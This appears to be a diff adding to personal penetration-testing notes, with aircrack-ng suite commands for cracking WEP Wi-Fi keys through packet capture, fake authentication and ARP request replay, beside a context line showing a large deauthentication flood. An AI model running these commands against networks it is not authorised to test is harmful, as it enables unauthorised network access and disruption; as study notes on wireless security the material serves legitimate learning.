@@ -57,3 +57,31 @@ aireplay-ng --deauth 100000000 -a 54:37:BB:B5:BB:09 -c 70:BB:E9:7B:AE:D2 wlan0
 ```
 
 ---
+
+* WEP(Wired Equivalent Privacy) can be cracked using two tools: _airodump-ng_ and _aircrack-ng_.
+
+* To crack into a busy WEP network:
+
+```shell
+airodump-ng --bssid 54:37:BB:B5:BB:09 --channel 4 --write wep_test wlan0
+#capturing data packets from WEP network and writing it into a file
+
+aircrack-ng wep_test-01.cap
+#analyze captured data, cracks the key and prints it
+```
+
+* To crack into a non-busy WEP network, we need to do a fake authentication attack:
+
+```shell
+airodump-ng --bssid 54:37:BB:B5:BB:09 --channel 11 --write arpreplay wlan0
+
+aireplay-ng --fakeauth 0 -a 70:BB:E9:7B:AE:D2 -h 1A:AB:2E:49:AA:AD wlan0
+#to associate with network; uses aireplay-ng tool to run a fake authentication attack on given MAC address access point (-a) and by wireless adapter having monitor mode(-h).
+
+aireplay-ng --arpreplay -b 70:BB:E9:7B:AE:D2 -h 1A:AB:2E:49:AA:AD wlan0
+#ARP request replay; forces access point to generate new IVs
+
+aircrack-ng arpreplay-01.cap
+```
+
+---
